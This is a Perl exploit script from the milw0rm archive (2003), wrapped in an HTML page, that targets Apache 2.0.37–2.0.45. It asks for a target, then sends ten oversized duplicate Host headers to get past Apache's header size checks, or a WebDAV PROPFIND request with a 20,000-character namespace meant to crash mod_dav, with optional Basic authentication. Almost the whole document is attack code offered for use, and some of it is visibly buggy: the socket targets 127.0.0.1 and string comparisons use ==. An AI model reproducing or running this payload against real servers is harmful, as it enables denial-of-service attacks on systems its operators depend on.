<html><head><title>Apache <= 2.0.45 APR Remote Exploit -Apache-Knacker.pl</title></head><pre>#!/usr/bin/perl
#
# Apache 2.0.37 - 2.0.45 APR Exploit
# Written By Matthew Murphy
#
# This Perl script will successfully exploit any un-patched Apache 2.x
# servers.
#

# Base64 Encoder
#
# If you want authentication with the server via HTTP's lame Basic
# auth, put the proper string to encode BASE64 content, and use
# '%s' to represent the credentials being encoded.  For instance:
#
# base64 %s
#
# would result in:
#
# base64 userid:password
#
# If your decoder requires you to use STDIN to pass the password
# (no pun intended), set $BASE64_USE_STDIN to nonzero and do not
# use '%s' on the command-line.
$BASE64_CMD_STRING = &quot;use_base64_encoder_here %s&quot;;

# Base64 encoder piping
#
# If your encoder requires the password to be written to STDIN,
# set this to a nonzero value.  NOTE: This requires support for 
# bi-directional pipes on your OS version.
$BASE64_USE_STDIN = 0;

# Base64 encoder input handling
#
# If your encoder requires a newline after your credentials, 
# set this to your newline character.
$BASE64_WRITE_NL = &quot;&quot;;

use IO::Socket;
print STDOUT &quot;Apache 2.0 APR Exploit\r\n&quot;;
print STDOUT &quot;By Matthew Murphy\r\n\r\n&quot;;
print STDOUT &quot;Enter the hostname/IP address of the server: &quot;;
$line = &lt;STDIN&gt;;
$host = mychomp($line);
print STDOUT &quot;Enter the port of the server \[80\]: &quot;;
$line = &lt;STDIN&gt;;
$port = mychomp($line);
print STDOUT &quot;Use authentication credentials for the session \[Y/N\]? &quot;;
$line = &lt;STDIN&gt;;
$char = mychomp($line);
if ($char == &quot;Y&quot; || $char == &quot;y&quot;) {
	print STDOUT &quot;What username shall we use: &quot;;
	$line = &lt;STDIN&gt;;
	$user = mychomp($line);
	print STDOUT &quot;What password shall we use: &quot;;
	$line = &lt;STDIN&gt;;
	$pass = mychomp($line);
	$auth = &quot;$user:$pass&quot;;
	if ($BASE64_USE_STDIN) {
		# l33t Perl piping trix; NOTE: This is definitely
		# Alpha code! :-)
		pipe(STDOUTREAD, STDOUTWRITE);
		pipe(STDINREAD, STDINWRITE);
		open(OLDSTDIN, &quot;&amp;STDIN&quot;);
		open(OLDSTDOUT, &quot;&gt;&amp;STDOUT&quot;);
		open(STDIN, &quot;&amp;STDINREAD&quot;);
		open(STDOUT, &quot;&gt;&amp;STDOUTWRITE&quot;);
		close(STDINREAD);
		close(STDOUTWRITE);
		system($BASE64_CMD_STRING);
		open(STDIN, &quot;&amp;OLDSTDIN&quot;);
		open(STDOUT, &quot;&amp;&gt;OLDSTDOUT&quot;);
		close(OLDSTDIN);
		close(OLDSTDOUT);
		print STDINWRITE $auth;
		close(STDINWRITE);
		read(STDOUTREAD, $base64, 4096); # Edit for insane passwords
		close(STDOUTREAD);
	} else {
		open(READOUTPUT, sprintf($BASE64_CMD_STRING, $auth).&quot;|&quot;);
		read(READOUTPUT, $base64, 4096); # See above
		close(READOUTPUT);
	}
	# Another hack for dealing with base64 encoders that output 
	# multi-lined encoded text.  HTTP specifically calls for a 
	# single line.  Note that this pattern also messes with spaces, 
	# tabs, etc., but base64 doesn't use those either, so this 
	# shouldn't matter.
	$base64 = join(&quot;&quot;, split(/ /, $base64));
} else {
	$base64 = undef;
}
$f = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;127.0.0.1&quot;);
print STDOUT &quot;Exploiting a proxy server \[Y/N\]? &quot;;
$line = &lt;STDIN&gt;;
$char = mychomp($line);
if ($char == &quot;Y&quot; || $char == &quot;y&quot;) {
	print $f &quot;GET / HTTP/1.1\x0d\x0a&quot;;

	# Apache 2.0 tries to limit header inputs, but uses a hash table 
	# that ultimately concatenates multiple headers of the same name 
	# together with &quot;, &quot; between them, so:
	#
	# Host: a
	# Host: b
	#
	# Bypasses Apache's buffer size checks, but ends up as:
	#
	# Host: a,b
	#
	# When processed.  Confirm this with a TRACE against your server:
	#
	# TRACE / HTTP/1.1
	# Host: a
	# Host: b
	#
	# The &quot;message/http&quot; body you receive will contain:
	#
	# TRACE / HTTP/1.1
	# Host: a,b
	#
	# So, for those of you who are confused by this code fragment, 
	# this is what it ultimately achieves!
	for ($i = 0; $i &lt; 10; $i++) {
		print $f &quot;Host: &quot;.(&quot;A&quot;x2000).&quot;\r\n&quot;;
	}
	if (defined($base64)) {
		print $f &quot;Proxy-Authorization: Basic &quot;.$base64.&quot;\r\n&quot;;
	}
	print $f &quot;\r\n&quot;;
} else {
	print STDOUT &quot;What resource should be probed: &quot;;
	$line = &lt;STDIN&gt;;
	$res = mychomp($line);
	print STDOUT &quot;Exploit a DAV repository for this attack? \[Y/N\] &quot;;
	$line = &lt;STDIN&gt;;
	$char = mychomp($line);
	if ($char == &quot;Y&quot; || $char == &quot;y&quot;) {
		# WARNING:
		# Another section of alpha code here; mod_dav tends to barf
		# if given the smallest inconsistency, and this is not 
		# exactly well-researched.  If this doesn't work for you, 
		# target your DAV repository as a typical resource: if 
		# UseCanonicalName On hasn't been set explicitly, mod_dav 
		# will choke on that as well.
		#
		# STunnel should not have issues with this, as you can't 
		# use a &quot;Host&quot; header in an SSL connection anyway, so 
		# that is no problem.
		#
		# Note that if the body is too long, IIS servers will also 
		# die (assuming of course, that the latest IIS cumulative 
		# patch has not been applied), as they have had problems 
		# dealing with WebDAV in the very recent past.

		# XML Body of Request
		#
		# If everything works, mod_dav will attempt to format a 
		# message with apr_psprintf() to indicate that our 
		# namespace is invalid, leading to a crash.
		$xmlbody = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\r\n&quot;;
		$xmlbody.= &quot;&lt;D:propfind xmlns:D=\&quot;&quot;.(&quot;A&quot;x20000).&quot;\:\&quot;&gt;\r\n&quot;;
		$xmlbody.= &quot;\x20\x20\x20\x20&lt;D:allprop/&gt;\r\n&quot;;
		$xmlbody.= &quot;&lt;/D:propfind&gt;&quot;;

		# HTTP headers
		print $f &quot;PROPFIND $res HTTP/1.1\r\n&quot;;
		print $f &quot;Host: $host:$port\r\n&quot;;
		print $f &quot;Depth: 1\r\n&quot;;
		print $f &quot;Content-Type: text/xml; charset=\&quot;utf-8\&quot;\r\n&quot;;
		print $f &quot;Content-Length: &quot;.length($body).&quot;\r\n\r\n&quot;;
		if (defined($base64)) {
			print $f &quot;Authorization: Basic &quot;.$base64.&quot;\r\n&quot;;
		}
		print $f &quot;$xmlbody\r\n\r\n&quot;;
	} else {
		# This does *almost* the exact same thing as the mod_proxy 
		# code, and could be considered wasteful, but a few extra 
		# CPU cycles never killed anybody. :-(
		print $f &quot;GET $res HTTP/1.1\r\n&quot;;
		for ($i = 0; $i &lt; 10; $i++) {
			print $f &quot;Host: &quot;.(&quot;A&quot;x2000).&quot;\r\n&quot;;
		}
		if (defined($base64)) {
			print $f &quot;Authorization: Basic &quot;.$base64.&quot;\r\n&quot;;
		}
		print $f &quot;\r\n&quot;;
	}
}
while (defined($ln = &lt;$f&gt;)) {
	print STDOUT $ln;
}
undef $f;
exit;

# FIXED: The perl chomp() function is broken on my distro,
# so I hacked a fix to work around it.  This note applies
# to ActivePerl 5.8.x -- I haven't tried others.  This is
# another hackish fix, which seems to be the entire style
# of this code.  I'll write better toys when I have time to
# write better toys.
sub mychomp {
	my $data;
	my $arg = shift;
	my $CRLF;
	if ($^O == &quot;MSWin32&quot;) {
		$CRLF = 1;
	} else {
		$CRLF = 0;
	}
	$data = substr($arg, 0, length($arg) - $CRLF);
	return $data;
}


# milw0rm.com [2003-06-08]</pre></html>